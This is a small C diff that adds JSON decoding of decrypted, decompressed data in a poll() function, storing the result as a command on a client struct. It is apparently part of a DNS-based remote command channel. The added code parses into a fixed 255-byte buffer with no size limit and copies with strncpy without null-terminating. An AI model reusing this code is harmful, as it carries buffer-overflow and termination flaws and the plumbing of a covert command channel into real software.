@@ -7,6 +7,7 @@
 #include "options.h"
 #include "compression.h"
 #include "crypt.h"
+#include "json.h"
 
 /* DNS STUFF */
 #include <sys/types.h>
@@ -166,7 +167,12 @@ void poll(client_t *client)
         size_t clear_len = decrypt(inflated, inflated_len, clear);
         hex_dump("clear", clear, clear_len);
 
-        // TODO: json decode to get raw command
-        return;
+        // decode json
+        char c[255];
+        size_t l = parse_json_command(clear, c);
+
+        // copy the command to the client
+        strncpy(client->command, c, l);
+        client->status = Command;
     }
 }
